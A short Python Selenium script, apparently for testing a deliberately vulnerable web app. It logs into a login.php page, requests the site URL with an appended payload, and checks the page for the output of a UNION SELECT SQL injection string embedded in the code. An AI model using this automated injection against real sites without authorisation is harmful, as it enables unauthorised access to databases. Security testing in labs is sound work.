import sys
from typing import NoReturn

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options


def attack(site: str, payload: str, username: str, password: str):
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    driver.get(site)

    # check for a login page
    if driver.current_url.endswith("/login.php"):
        username_element = driver.find_element(By.NAME, "username")
        password_element = driver.find_element(By.NAME, "password")

        username_element.send_keys(username)
        password_element.send_keys(password)

        button = driver.find_element(By.NAME, "Login")
        button.click()

    driver.get(site + payload)

    # a simple check for the output of the injected query
    source = str(driver.page_source)
    out = ("ID: a' UNION SELECT \"text1\",\"text2\";-- -<br>First name: text1<br>Surname: text2" in source and
           "First name: text1" in source and
           "Surname: text2" in source)

    driver.quit()

    return out


def main(target, payload, username, password):
    print(attack(target, payload, username, password))
